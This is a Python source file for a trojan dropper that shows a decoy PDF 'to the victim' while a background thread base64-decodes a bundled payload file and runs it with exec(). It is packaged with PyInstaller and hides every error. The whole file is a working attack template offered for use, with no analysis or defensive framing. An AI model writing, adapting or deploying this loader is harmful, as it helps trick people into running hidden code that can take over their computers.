import base64
import subprocess
import threading
import os
import sys

pdf_name = "test.pdf"  # Legit PDF to display to the victim

def get_resource_path(relative_path):
    """Get absolute path to resource (works for dev and PyInstaller)"""
    try:
        base_path = sys._MEIPASS  # Used by PyInstaller
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def decode_and_run():
    try:
        payload_path = get_resource_path("payload.b64")
        with open(payload_path, "r") as f:
            code = base64.b64decode(f.read()).decode()
            exec(code)
    except Exception as e:
        pass  # You can log the error if debugging

def open_legit_pdf():
    try:
        pdf_path = get_resource_path(pdf_name)
        subprocess.Popen(["start", "", pdf_path], shell=True)
    except Exception as e:
        pass  # You can log the error if debugging

# ------------ EXECUTION ------------
threading.Thread(target=decode_and_run).start()
open_legit_pdf()
